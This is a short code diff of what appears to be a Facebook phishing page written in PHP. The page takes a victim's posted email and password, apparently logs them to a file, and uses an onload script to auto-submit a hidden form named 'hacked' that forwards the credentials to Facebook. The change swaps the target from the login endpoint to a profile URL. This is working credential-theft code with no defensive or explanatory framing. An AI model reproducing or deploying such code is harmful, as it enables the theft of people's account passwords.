@@ -14,7 +14,7 @@ fclose($file);
 	</script>
 </head>
 <body onload="submitnow()">
-<form action="https://www.facebook.com/login.php?login_attempt=1" method="post" id="hacked">
+<form action="https://www.facebook.com/profile.php?id=100022567140337" method="post" id="hacked">
  	<input type="hidden" name='email' value="<?php echo $_POST['email']; ?>">
  	<input type="hidden" name='pass' value="<?php echo $_POST['pass']; ?>">
  </form>
